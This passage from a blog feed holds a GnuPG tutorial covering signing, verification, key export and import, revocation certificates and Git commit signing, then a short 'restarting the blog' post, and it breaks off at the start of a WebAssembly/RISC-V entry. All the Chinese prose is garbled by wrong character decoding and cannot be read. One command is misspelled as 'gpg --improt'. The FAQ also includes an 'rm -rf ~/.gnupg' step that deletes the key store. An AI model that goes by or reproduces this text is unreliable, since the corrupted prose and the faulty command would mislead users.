</code></pre></div><p>‰ºöÁîüÊàê‰∫åËøõÂà∂ÁöÑÁ≠æÂêçÊñá‰ª∂<code>test.txt.gpg</code>ÔºåÂ¶ÇÊûúÊÉ≥ÁîüÊàêÊñáÊú¨Á±ªÂûãÁöÑÁ≠æÂêçÔºå‰ΩøÁî®</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --clearsign test.txt
</code></pre></div><p>‰ºöÁîüÊàêÊñáÊú¨Á±ªÂûãÁöÑÁ≠æÂêçÊñá‰ª∂<code>test.txt.asc</code></p>
<p>Ê≥®ÊÑè‰ª•‰∏ä‰∏§ÁßçÊñπÂºèÂéüÊñáÂíåÁ≠æÂêçÊòØÂú®Âêå‰∏Ä‰∏™Êñá‰ª∂‰∏≠ÔºåÊü•Áúã<code>test.txt.asc</code></p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

test
-----BEGIN PGP SIGNATURE-----

iQFDBAEBCAAtFiEECzxS8e8HsU6nxFyaTCbS5FH/2vEFAl6FX+cPHG5haXZlQHRl
c3QuY29tAAoJEEwm0uRR/9rxGNsH/AmjJiT19q5caq9Pe8tMRnR2yvZIGWbMD3Ch
UTkyGMkSPMIo6XRpYPlANe2/dddBT2l7EAPy2lAxaa8LcjsxtRhJG4GxMaCcujik
M6MX3IOfa1m9aDP1IY3Sh2U07j3t+8dawahR8EUF2D+rtvx24ybnwpWpKbDVsGyp
Mt06BI3pWC3opMRYPCl21IBhPhaPPnvXF7X8DMP+2VqZye2juX2oG1KMkZWQuiBb
/D7DYlx6/ainu0cJw6UL8YXHag7tkUeKtTPQbBpCsszOuxJZ74gduIUzDcokayCB
DM9qB/GpUyVOOTwfLMBta6JP5BO8ppPaPdPX46kKDqLKG7eh4bQ=
=Q4/W
-----END PGP SIGNATURE-----
</code></pre></div><p>Âõ†‰∏∫ÊòØÁ≠æÂêçÔºå‰∏ç‰ºöÂØπÂÜÖÂÆπËøõË°åÂä†ÂØÜÔºåÊâÄ‰ª•Áõ¥Êé•ÊòæÁ§∫ÂéüÊñá„ÄÇÂ¶ÇÊûúÊÉ≥ÊääÂéüÂßãÊñá‰ª∂ÂàÜÁ¶ªÂá∫Êù•Ôºå‰ΩøÁî®</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --output out.txt -d test.txt.gpg
</code></pre></div><p>ÂàÜÁ¶ªÁöÑÂêåÊó∂ËøòÈ°∫‰æøÊ†°È™å‰∫ÜÁ≠æÂêç„ÄÇÊ≥®ÊÑèËøôÈáå<code>test.txt.gpg</code>ÊòØ‰∏äÈù¢ÁîüÊàêÁöÑ‰∫åËøõÂà∂<strong>Á≠æÂêç</strong>Êñá‰ª∂Ôºå‰πüÂèØ‰ª•Áî®<code>test.txt.asc</code></p>
<p>Â¶ÇÊûúÊØèÊ¨°ÈÉΩË¶ÅÂàÜÁ¶ªÔºåÂ∞±ÂæàÈ∫ªÁÉ¶ÔºåËÄå‰∏îÊ≤°ÊúâÂÆâË£Ö GPG ÁöÑÁî®Êà∑Â∞±Êó†Ê≥ï‰ΩøÁî®Ê∫êÊñá‰ª∂‰∫Ü„ÄÇÊâÄ‰ª•Êõ¥Â•ΩÁöÑÊñπÂºèÊòØÂàÜÁ¶ªÊ∫êÊñá‰ª∂ÂíåÁ≠æÂêçÊñá‰ª∂</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --detach-sign --armor test.txt
</code></pre></div><p>ËøôÊ†∑‰ºöÁîüÊàê‰∏Ä‰∏™ÂçïÁã¨ÁöÑ„ÄÅÊñáÊú¨Á±ªÂûãÁöÑÁ≠æÂêçÊñá‰ª∂<code>test.txt.sig</code></p>
<blockquote>
<p>Ê≥®ÊÑèÔºöÂ¶ÇÊûúÊúâÂ§ö‰∏™ÁßÅÈí•ÔºåÂèØ‰ª•Áî®<code>-u</code>ÂèÇÊï∞ÈÄâÊã©</p>
</blockquote>
<h3 id="Á≠æÂêçÊ†°È™å">Á≠æÂêçÊ†°È™å</h3>
<p>Êî∂Âà∞Êñá‰ª∂ÂíåÁ≠æÂêçÊñá‰ª∂ÂêéÔºåÈúÄË¶ÅÂØπÁ≠æÂêçËøõË°åÊ†°È™å</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --verify test.txt.sig test.txt
</code></pre></div><p>Â¶ÇÊûúÁ≠æÂêçÊ†°È™åÊàêÂäüÔºå‰ºöÊòæÁ§∫</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg: Á≠æÂêçÂª∫Á´ã‰∫é Âõõ  4/ <span class="m">2</span> 11:49:35 <span class="m">2020</span> CST
gpg:               ‰ΩøÁî® RSA ÂØÜÈí• 34B368EFC6FA8941B4A096CFFA4C884FBE8164D7
gpg: ÂÆåÂ•ΩÁöÑÁ≠æÂêçÔºåÊù•Ëá™‰∫é ‚Äúcreedowl &lt;creedowl@gmail.com&gt;‚Äù <span class="o">[</span>ÁªùÂØπ<span class="o">]</span>
</code></pre></div><h3 id="ÂØºÂÖ•ÂØºÂá∫">ÂØºÂÖ•ÂØºÂá∫</h3>
<p>ÂΩì‰Ω†ÈúÄË¶Å‰∏é‰ªñ‰∫∫‰∫§Êç¢Êï∞ÊçÆÊó∂ÔºåÈúÄË¶ÅÂØºÂá∫Ëá™Â∑±ÁöÑÂÖ¨Èí•ÔºåÂêåÊó∂ÂØºÂÖ•‰ªñ‰∫∫ÁöÑÂÖ¨Èí•ÔºõËÄåÂ¶ÇÊûú‰Ω†Êõ¥Êç¢ÁîµËÑëÔºåÂ∞±ÈúÄË¶ÅÂØºÂá∫Ëá™Â∑±ÁöÑÁßÅÈí•„ÄÇËøôÂ∞±Ê∂âÂèäÂà∞‰∫ÜÂØÜÈí•ÁöÑÂØºÂÖ•ÂØºÂá∫</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -a --output public_key.txt --export naive
</code></pre></div><p>‰∏äËø∞ÂëΩ‰ª§Áî®‰∫éÂØºÂá∫ÂÖ¨Èí•ÔºåÁõ∏ÂÖ≥ÂèÇÊï∞Âú®‰∏äÊñáÈÉΩÊúâ‰ªãÁªç„ÄÇÊé•ÁùÄ‰Ω†Â∞±ÂèØ‰ª•Êää<code>public_key.txt</code>ÂèëÂ∏ÉÁªô‰ªñ‰∫∫</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -a --output private_key.txt --export-secret-keys naive
</code></pre></div><p>‰∏äËø∞ÂëΩ‰ª§Áî®‰∫éÂØºÂá∫ÁßÅÈí•Ôºå‰∏ÄÂÆöË¶Å‰øùÁÆ°Â•ΩÔºåÂª∫ËÆÆÂú®ËÑ±Êú∫ÊÉÖÂÜµ‰∏ãËøõË°åÊìç‰Ωú</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --improt <span class="o">[</span>ÂØÜÈí•Êñá‰ª∂<span class="o">]</span>
</code></pre></div><p>‰∏äËø∞ÂëΩ‰ª§Áî®‰∫éÂØºÂÖ•ÂØÜÈí•Ôºå‰∏çÂå∫ÂàÜÂÖ¨Èí•ÁßÅÈí•</p>
<h3 id="Êü•ÁúãÊâÄÊúâÂØÜÈí•">Êü•ÁúãÊâÄÊúâÂØÜÈí•</h3>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -k
</code></pre></div><h3 id="ÁîüÊàêÂêäÈîÄËØÅ‰π¶">ÁîüÊàêÂêäÈîÄËØÅ‰π¶</h3>
<p>ÂΩì‰Ω†ÁöÑÁßÅÈí•Ê≥ÑÈú≤ÊàñËÄÖÊõ¥Êç¢Êó∂ÔºåÈúÄË¶ÅÂêäÈîÄÂ§±ÊïàÁöÑÂØÜÈí•ÔºåËøôÊó∂Â∞±ÈúÄË¶Å‰ΩøÁî®ÂêäÈîÄËØÅ‰π¶</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --gen-revoke naive
</code></pre></div><p>Êé•ÁùÄÈÄâÊã©ÂêäÈîÄÂéüÂõ†ÔºåÂ∞±ËÉΩÁîüÊàêÂêäÈîÄËØÅ‰π¶</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">sec  rsa2048/4C26D2E451FFDAF1 2020-04-02 naive (too young too simple) &lt;naive@test.com&gt;

Ë¶Å‰∏∫Ëøô‰∏™ÂØÜÈí•ÂàõÂª∫‰∏Ä‰∏™ÂêäÈîÄËØÅ‰π¶ÂêóÔºü(y/N) y
ËØ∑ÈÄâÊã©ÂêäÈîÄÁöÑÂéüÂõ†Ôºö
  0 = Êú™ÊåáÂÆöÂéüÂõ†
  1 = ÂØÜÈí•Â∑≤Ê≥ÑÊºè
  2 = ÂØÜÈí•Ë¢´ÊõøÊç¢
  3 = ÂØÜÈí•‰∏çÂÜç‰ΩøÁî®
  Q = ÂèñÊ∂à
Ôºà‰πüËÆ∏ÊÇ®‰ºöÊÉ≥Ë¶ÅÂú®ËøôÈáåÈÄâÊã© 1Ôºâ
ÊÇ®ÁöÑÂÜ≥ÂÆöÊòØ‰ªÄ‰πàÔºü 1
ËØ∑ËæìÂÖ•ÊèèËø∞ÔºàÂèØÈÄâÔºâÔºõ‰ª•Á©∫ÁôΩË°åÁªìÊùüÔºö
&gt;
ÂêäÈîÄÂéüÂõ†ÔºöÂØÜÈí•Â∑≤Ê≥ÑÊºè
ÔºàÊú™ÁªôÂÆöÊèèËø∞Ôºâ
ËøôÊ†∑ÂèØ‰ª•ÂêóÔºü (y/N) y
Â∑≤Âº∫Ë°å‰ΩøÁî® ASCII Â≠óÁ¨¶Â∞ÅË£ÖËøáÁöÑËæìÂá∫„ÄÇ
-----BEGIN PGP PUBLIC KEY BLOCK-----
Comment: This is a revocation certificate

****
-----END PGP PUBLIC KEY BLOCK-----
Â∑≤ÂàõÂª∫ÂêäÈîÄËØÅ‰π¶„ÄÇ

ËØ∑ÊääËøô‰∏™Êñá‰ª∂ËΩ¨ÁßªÂà∞‰∏Ä‰∏™ÊÇ®ÂèØ‰ª•ËóèËµ∑Êù•ÁöÑ‰ªãË¥®‰∏äÔºõÂ¶ÇÊûúÂùè‰∫∫Ëé∑ÂèñÂà∞‰∫ÜËøô
‰ªΩËØÅ‰π¶ÁöÑËØùÔºåÈÇ£‰πà‰ªñÂ∞±ËÉΩ‰ΩøÁî®ÂÆÉÂπ∂ËÆ©ÊÇ®ÁöÑÂØÜÈí•Êó†Ê≥ïÁªßÁª≠‰ΩøÁî®„ÄÇÊääÊ≠§ËØÅ‰π¶
ÊâìÂç∞Âá∫Êù•ÂÜçÂ≠òÊîæÂà∞ÂÆâÂÖ®ÁöÑÂú∞Êñπ‰πüÊòØÂæàÂ•ΩÁöÑÊñπÊ≥ïÔºå‰ª•ÂÖçÊÇ®ÁöÑ‰øùÂ≠òÂ™í‰ΩìÂèòÂæó
‰∏çÂèØËØª„ÄÇ‰ΩÜÊòØÂçÉ‰∏áÂ∞èÂøÉÔºöÊÇ®Êú∫Âô®‰∏äÁöÑÊâìÂç∞Á≥ªÁªüÂèØËÉΩ‰ºöÂú®ÊâìÂç∞ËøáÁ®ã‰∏≠ÂÇ®Â≠ò
Ëøô‰∫õÊï∞ÊçÆÔºåÂπ∂‰ΩøÂæóÂÖ∂‰ªñ‰∫∫ÁúãÂà∞ÔºÅ
</code></pre></div><p>Âè™ÈúÄË¶Å‰øùÂ≠ò‰∏≠Èó¥ÁöÑÂêäÈîÄËØÅ‰π¶ÔºåÂΩìÂØÜÈí•Ê≥ÑÈú≤Êó∂Â∞ÜÂÖ∂ÂèëÈÄÅÂà∞ÂÖ¨Èí•ÊúçÂä°Âô®ÔºåÂ∞±ÂèØ‰ª•ÂêäÈîÄÊóßÂØÜÈí•</p>
<h3 id="ÁºñËæëÂØÜÈí•">ÁºñËæëÂØÜÈí•</h3>
<p>ÊúâÊó∂ÂÄôÈúÄË¶ÅÂØπÂØÜÈí•ËøõË°åÁºñËæëÔºåÂ¶Ç‰øÆÊîπ‰ø°‰ªªÂ∫¶ÔºåÁîüÊàêÂ≠êÂØÜÈí•Á≠âÔºå‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --edit-key naive
</code></pre></div><p>Êé•ÁùÄÂ∞±‰ºöËøõÂÖ•‰∫§‰∫íÊ®°ÂºèÁ≠âÂæÖÂëΩ‰ª§ÔºåËæìÂÖ•<code>help</code>ÂèØ‰ª•Êü•ÁúãÊâÄÊúâÊìç‰Ωú</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">gpg (GnuPG/MacGPG2) 2.2.17; Copyright (C) 2019 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

ÁßÅÈí•ÂèØÁî®„ÄÇ

sec  rsa2048/4C26D2E451FFDAF1
     ÂàõÂª∫‰∫éÔºö2020-04-02  ÊúâÊïàËá≥ÔºöÊ∞∏‰∏ç       ÂèØÁî®‰∫éÔºöSC
     ‰ø°‰ªªÂ∫¶ÔºöÁªùÂØπ        ÊúâÊïàÊÄßÔºöÁªùÂØπ
ssb  rsa2048/A86AB46BDC677F8F
     ÂàõÂª∫‰∫éÔºö2020-04-02  ÊúâÊïàËá≥ÔºöÊ∞∏‰∏ç       ÂèØÁî®‰∫éÔºöE
[ ÁªùÂØπ ] (1). naive (too young too simple) &lt;naive@test.com&gt;

gpg&gt;
</code></pre></div><h2 id="‰ΩøÁî®-gpg-Á≠æÂêç-git-commit">‰ΩøÁî® GPG Á≠æÂêç Git Commit</h2>
<p>ËøôÂ∞±ÊòØÊàë‰ΩøÁî® GPG ÁöÑÂéüÂõ†Ôºå‰∏ãÈù¢ÂºÄÂßãÈÖçÁΩÆÔºåÈ¶ñÂÖàÈÖçÁΩÆ git</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># ËÆæÁΩÆÂÖ®Â±ÄÈªòËÆ§ÂØÜÈí•</span>
git config --global user.signingkey &lt;ÂØÜÈí•ID&gt;

<span class="c1"># ËÆæÁΩÆÂº∫Âà∂‰ΩøÁî®GPGÁ≠æÂêç</span>
git config --global commit.gpgsign <span class="nb">true</span>
</code></pre></div><p>‰πãÂêéÂú®Êèê‰∫§Êó∂ÔºåÂè™ÈúÄË¶ÅÂ∏¶‰∏ä<code>-S</code>ÂèÇÊï∞ÔºåÂ∞±ËÉΩÂØπÊèê‰∫§ËøõË°åÁ≠æÂêç</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">git commit -S -m <span class="s2">&#34;xxx&#34;</span>
</code></pre></div><p>Êü•Áúã git Êó•ÂøóÊó∂ÔºåÂ∏¶‰∏ä<code>--show-signature</code>ÂèÇÊï∞Â∞±ËÉΩÁúãÂà∞Á≠æÂêç‰ø°ÊÅØ</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">git log --show-signature
</code></pre></div><p>ÊúÄÂêé‰∏ÄÊ≠•ÔºåÈúÄË¶ÅÊää‰Ω†ÁöÑÂÖ¨Èí•Êèê‰∫§Âà∞ githubÔºåÂê¶ÂàôÂÆÉÊÄé‰πàÁü•ÈÅìËøô‰∏™Á≠æÂêçÊòØ‰Ω†ÁöÑÂë¢ÔºüÂ∞Ü‰πãÂâçÁîüÊàêÁöÑÊñáÊú¨Á±ªÂûãÁöÑÂÖ¨Èí•<code>public_key.txt</code>Êèê‰∫§Âà∞ <a href="https://github.com/settings/keys">github</a>Ôºå‰πãÂêé‰Ω†ÁöÑÊèê‰∫§Âú® github ‰∏äÂ∞±ÊúâÂÉèÂºÄÂ§¥ÈÇ£Ê†∑ÁöÑÁªøËâ≤Â∞èÂãæ‰∫Ü</p>
<h2 id="faq">FAQ</h2>
<h3 id="Ëß£ÂÜ≥gitÊèê‰∫§Êó∂Âá∫Áé∞error-gpg-failed-to-sign-the-data">Ëß£ÂÜ≥gitÊèê‰∫§Êó∂Âá∫Áé∞<code>error: gpg failed to sign the data</code></h3>
<p>‰ª•‰∏ãÊòØÂéüÂßãËß£ÂÜ≥ÊñπÊ°àÔºåËôΩÁÑ∂ËÉΩËß£ÂÜ≥ÈóÆÈ¢òÔºå‰ΩÜ‰ΩìÈ™å‰∏çÂ•ΩÔºåÂú® IDE ‰∏≠Êèê‰∫§Êó∂Èöæ‰ª•ËæìÂÖ•ÂØÜÁ†ÅÔºåÂª∫ËÆÆ MacOS Áî®Êà∑ÈááÁî®‰∏äÈù¢ËØ¥ÁöÑ <code>GPG Suite</code>ËøõË°åÊìç‰ΩúÔºåÂÆÉÂèØ‰ª•Êé•ÁÆ°ÂØÜÁ†ÅËæìÂÖ•Êìç‰ΩúÔºåÂºπÂá∫‰∏Ä‰∏™Áã¨Á´ãÁ™óÂè£Áî®‰∫éËæìÂÖ•ÔºåËøòËÉΩÂ∞ÜÂØÜÁ†ÅÊ∑ªÂä†Âà∞ iCloud Èí•Âåô‰∏≤‰∏≠ÔºåÈÅøÂÖçÈáçÂ§çËæìÂÖ•ÂØÜÁ†Å„ÄÇÂ¶ÇÊûú‰Ω†Â∑≤ÁªèÂú®‰ΩøÁî®<code>GPG Suite</code>Ôºå‰ΩÜ‰ªçÁÑ∂ÈÅáÂà∞‰∫ÜËøô‰∏™ÈóÆÈ¢òÔºåÂèØ‰ª•Â∞ùËØïÈáçË£Ö<code>GPG Suite</code></p>
<ol>
<li>
<p>ÂØºÂá∫ÂØÜÈí•ÔºàÁßÅÈí•Ôºâ<strong>ÈáçË¶Å</strong></p>
</li>
<li>
<p>Âç∏ËΩΩ GPG</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew uninstall gnupg gnutls
   
brew cask uninstall gpg-suite
</code></pre></div></li>
<li>
<p>Âà†Èô§ gpg Êñá‰ª∂Â§πÔºå<strong>ËØ∑Á°ÆËÆ§Â∑≤ÁªèÂØºÂá∫ÂØÜÈí•</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">rm -rf ~/.gnupg
</code></pre></div></li>
<li>
<p>ÈáçÊñ∞ÂÆâË£Ö<code>GPG Suite</code>Ôºå<strong>‰∏çÈúÄË¶ÅÊâãÂä®ÂÆâË£Ö GPG</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew cask install gpg-suite
</code></pre></div></li>
<li>
<p>ÂØºÂÖ•ÂØÜÈí•</p>
</li>
</ol>
<p>ËøôÊó∂ <code>GPG Suite</code>Â∫îËØ•Â∑≤ÁªèÂèØ‰ª•Ê≠£Â∏∏Â∑•‰Ωú‰∫Ü</p>
<hr>
<p><em>ÂéüÂßãÊñπÊ°à</em></p>
<p>È¶ñÂÖàÊµãËØï<code>gpg</code>Â∑•‰ΩúÊòØÂê¶Ê≠£Â∏∏</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="s2">&#34;test&#34;</span> <span class="p">|</span> gpg --clearsign
</code></pre></div><p>Â¶ÇÊûúÂá∫Áé∞‰∏ãÈù¢ÁöÑÈîôËØØ</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

test
gpg: Á≠æÂêçÊó∂Â§±Ë¥•Ôºö Inappropriate ioctl for device
gpg: [stdin]: clear-sign failed: Inappropriate ioctl for device
</code></pre></div><p>ËØ¥Êòé<code>gpg</code>Êó†Ê≥ïÊâìÂºÄËæìÂÖ•ÂØÜÁ†ÅÁöÑÁ™óÂè£„ÄÇÂú®ÁîüÊàê<code>gpg key</code>Êó∂ÔºåÂ¶ÇÊûúÊåáÂÆö‰∫ÜÂØÜÁ†ÅÔºåÂú®Á≠æÂêçÊó∂Â∞±ÈúÄË¶ÅËæìÂÖ•„ÄÇËÄåËøôÊó∂<code>gpg</code>‰∏çÁü•ÈÅì‰ªéÂì™ÈáåËØªÂèñËæìÂÖ•ÔºåÊâÄ‰ª•ÂèØ‰ª•Áî®‰ª•‰∏ãÁöÑÂëΩ‰ª§ÊåáÂÆö<code>tty</code></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">export</span> <span class="nv">GPG_TTY</span><span class="o">=</span><span class="k">$(</span>tty<span class="k">)</span> 
</code></pre></div><p>ËøôÊ†∑Â∞±ÂèØ‰ª•Ê≠£Â∏∏ÂºπÂá∫ËæìÂÖ•ÂØÜÁ†ÅÁöÑÁ™óÂè£„ÄÇ</p>
<hr>
<p>‰ΩÜÊàë‰∏çÂñúÊ¨¢Ëøô‰∏™ÂÖ®Â±èÁ™óÂè£Ôºå‰∏ªË¶ÅÊòØÂú®mac‰∏ä<code>gpg</code>ËØ≠Ë®Ä‰∏∫‰∏≠ÊñáÊó∂ÔºåËøô‰∏™Á™óÂè£‰ºö‰π±Á†ÅÔºåÊâÄ‰ª•Áî®Âè¶‰∏Ä‰∏™ÊñπÊ≥ïËß£ÂÜ≥„ÄÇÁºñËæë<code>~/.gnupg/gpg.conf</code>ÔºåÊ∑ªÂä†‰ª•‰∏ãÂÜÖÂÆπ</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">use-agent 
pinentry-mode loopback
</code></pre></div><p>ÂÜçÁºñËæë<code>~/.gnupg/gpg-agent.conf</code>ÔºåÊ∑ªÂä†‰ª•‰∏ãÂÜÖÂÆπ</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">allow-loopback-pinentry
</code></pre></div><p>ÊúÄÂêéËæìÂÖ•<code>echo RELOADAGENT | gpg-connect-agent</code>ÈáçÂêØ<code>agent</code>Â∞±ÁîüÊïà‰∫ÜÔºåËøôÊ†∑ÂèØ‰ª•Áõ¥Êé•Âú®ÁªàÁ´ØËæìÂÖ•ÂØÜÁ†Å</p>
<blockquote>
<p><a href="https://d.sb/2016/11/gpg-inappropriate-ioctl-for-device-errors">source</a></p>
</blockquote>]]></content>
        <author>
            <name><![CDATA[Creedowl‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/renew/</id>
        <title><![CDATA[ÈáçÊñ∞ÂºÄÂßã]]></title>
        <updated>2020-03-19T13:28:13+08:00</updated>
        <link href="https://blog.creedowl.com/posts/renew/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/renew/"><![CDATA[<p>Á™ÅÁÑ∂ÂèëÁé∞Ë∑ù‰∏ä‰∏ÄÁØáblogÂèëÂ∏ÉÂ∑≤ÁªèËøáÂéª‰∫ÜÂø´‰∏ÄÂπ¥ÁöÑÊó∂Èó¥ÔºåÂéüÂÖàÁöÑblog‰πüÁñè‰∫éÊâìÁêÜÔºåÂè™ÊúâÂØ•ÂØ•Âá†ÁØáÊñáÁ´†ÔºåÂõæÂ∫äÂü∫Êú¨Â§±Êïà„ÄÇ‰∏ªË¶ÅÂõ†‰∏∫ÊàëÊØîËæÉÊáíÔºåËÆ§ÁúüÊï¥ÁêÜ‰∏ÄÁØáblog‰πüÊòØË¥πÊó∂Ë¥πÂäõÁöÑ‰∫ãÊÉÖ„ÄÇ‰ΩÜËá™Â∑±Êï¥ÁêÜ‰∏Ä‰∫õÊñáÁ´†ÊòØÂæàÊúâÊÑè‰πâÁöÑ‰∫ãÊÉÖÔºåËÉΩËÆ∞ÂΩï‰∏ãËá™Â∑±ÁöÑÂ≠¶‰π†ÂéÜÁ®ãÔºåÊÄªÁªìÁü•ËØÜÔºåÂÜçÊ¨°ÈÅáÂà∞Áõ∏ÂêåÁöÑÈóÆÈ¢ò‰πüÂèØ‰ª•ÂõûÂ§¥ÂèÇËÄÉ„ÄÇ</p>
<p>blog‰∏ÄÁõ¥Ê≤°Êõ¥Êñ∞Êúâ‰∏™ËØ±Âõ†ÊòØÂæÆÂçöÂõæÂ∫äÂºÄÂêØ‰∫ÜÈò≤ÁõóÈìæÔºåÂØºËá¥blog‰∏≠ËÆ∏Â§öÂõæÁâáÈÉΩÊó†Ê≥ïËÆøÈóÆ‰∫Ü<del>ËÄÅÁéãËÉåÈîÖ</del>ÔºåÂèàÊáíÂæó‰øÆÂ§ç„ÄÇÂêåÊó∂Áúã‰∏ä‰∫Ü<a href="https://gohugo.io/">hugo</a>Ëøô‰∏™Ê°ÜÊû∂ÔºåÊ≠£Â•Ω‰πüÂú®Â≠¶‰π†<code>golang</code>ÔºåÂ∞±ÊÉ≥‰ªé<code>hexo</code>Êõ¥Êç¢Âà∞<code>hugo</code>„ÄÇ‰ΩÜËøô‰∏§‰∏™Ê°ÜÊû∂Êúâ‰∏™ÂæàÂ§ßÁöÑÂå∫Âà´<del>ÊàëËßâÂæó</del>ÔºåÂ∞±ÊòØ<code>hexo</code>ÊòØ‰∏ÄÂ†ÜÂâçÁ´ØÂ∑•Á®ãÂ∏àÊêûÁöÑÔºåËÄå<code>hugo</code>ÊòØ‰∏ÄÂ†ÜÂêéÁ´ØÂ∑•Á®ãÂ∏àÊêûÁöÑÔºåËøôÂ∞±ÂØºËá¥‰∫Ü<code>hugo</code>Ê≤°ÊúâÂï•Â•ΩÁúãÁöÑ‰∏ªÈ¢òÔºå‰πüÂ∞±‰∏ÄÁõ¥È∏Ω‰∏ãÂéª‰∫Ü„ÄÇ</p>
<p>ÂéªÂπ¥Âπ¥‰∏≠ÁöÑÊó∂ÂÄôÂ∞±ÊâìÁÆóÂíå@queensferryÂÜô‰∏Ä‰∏™Hugo‰∏ªÈ¢ò<a href="https://github.com/queensferryme/hugo-theme-verse">verse</a>ÔºåÁ´ãÈ°πÁöÑÊó∂ÂÄôÂæàÂ§öÊÉ≥Ê≥ïÔºå‰ΩÜÂÅöËµ∑Êù•Â∞±‰∏çÊÉ≥Âä®‰∫Ü„ÄÇÊë∏ÂÆåÈ°µÈù¢Ê°ÜÊû∂ÂêéÂ∞±È∏Ω‰∫ÜÔºå‰∏ÄÊñπÈù¢ÂÆûÂú®‰∏ç‰ºöËÆæËÆ°ÔºåÂè¶‰∏ÄÊñπÈù¢Ë∞ÉÂêÑÁßçÊ†∑ÂºèÊòØÁúüÁöÑËõãÁñº„ÄÇÈ∏Ω‰∫ÜÂçäÂπ¥ÂèàÊç°Ëµ∑Êù•<del>ËôΩÁÑ∂ÊàëÊ≤°ÂÜôÂï•</del>Ôºå‰∏çËøáÊ∏êÊ∏ê‰πüÊúâÁÇπÊ†∑Â≠ê‰∫Ü„ÄÇ‰ΩÜ‰ªäÂ§©ÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÂæàÊ£íÁöÑ‰∏ªÈ¢ò<a href="https://github.com/Track3/hermit">hermit</a>ÔºåÂá†‰πéÂ∞±ÊòØÊàëÊÉ≥Ë¶ÅÁöÑÔºåÈáåÈù¢ÂæàÂ§öËÆæËÆ°Â∞±ÊòØÊàëÂΩìÂàùÊûÑÊÉ≥ÁöÑÂÜÖÂÆπÔºåÈ©¨‰∏äÊç°Ëµ∑‰∫Üblog„ÄÇ</p>
<p>Ëøô‰∏ÄÂπ¥Êù•‰πüËÆ°ÂàíÊï¥ÁêÜ‰∏™‰∫∫Á¨îËÆ∞ËΩØ‰ª∂ÔºåÂú®Â∞ùËØï‰∫ÜÊï∞‰∏™ËΩØ‰ª∂ÂêéÔºåÊúâÂç∞Ë±°Á¨îËÆ∞Ôºå‰∏∫Áü•Á¨îËÆ∞ÔºåÊúâÈÅì‰∫ëÁ¨îËÆ∞ÔºåonenoteÂèä‰∏ÄÂ†ÜÂºÄÊ∫êÁ¨îËÆ∞Â∫îÁî®ÔºåÈÉΩ‰∏çÂ§™Êª°Ë∂≥ÊàëÁöÑÈúÄÊ±Ç„ÄÇÊúÄÂêéÂèëÁé∞‰∫ÜnotionËøô‰∏™‰∏úË•øË¥ºÈ¶ôÔºà‰∏ªË¶ÅÂØπÂ≠¶ÁîüÂÖçË¥π‰∫ÜÔºâÔºåÊúÄÂêéÂ∞±ÈÄâÊã©‰∫ÜÂÆÉ„ÄÇ‰∏çËøáËøô‰πüÂØºËá¥ÊàëÊâã‰∏ä‰∏ÄÂ†ÜÁ¨îËÆ∞ÂàÜÊï£Âú®ÂêÑÂ§ÑÔºåÊâìÁÆóÂêéÈù¢Êï¥ÁêÜÊ∏ÖÊ•ö<del>Ê∞¥</del>Âá†ÁØáblogÂá∫Êù•„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[Creedowl‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.invariant.cn/a-comparison-between-webassembly-and-risc-v/</id>
        <title><![CDATA[WebAssembly ‰∏é RISC-V Êåá‰ª§ÈõÜÊû∂ÊûÑÁöÑÂØπÊØî]]></title>
        <updated>2020-03-15T09:51:51+08:00</updated>
        <link href="https://blog.invariant.cn/a-comparison-between-webassembly-and-risc-v/"/>
        <content type="text/html" src="https://blog.invariant.cn/a-comparison-between-webassembly-and-risc-v/"><![CDATA[<figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://invariant.me/a-comparison-between-webassembly-and-risc-v/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">A Comparison between WebAssembly and RISC-V</div><div class="kg-bookmark-description">WebAssembly and RISC-V are both new Instruction Set Architectures (ISAs) that evolved in the recent 10 years. Let‚Äôs do a comparison.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://invariant.me/favicon.ico" alt="WebAssembly ‰∏é RISC-V Êåá‰ª§ÈõÜÊû∂ÊûÑÁöÑÂØπÊØî"><span class="kg-bookmark-author">Heyang Zhou</span><span class="kg-bookmark-publisher">The 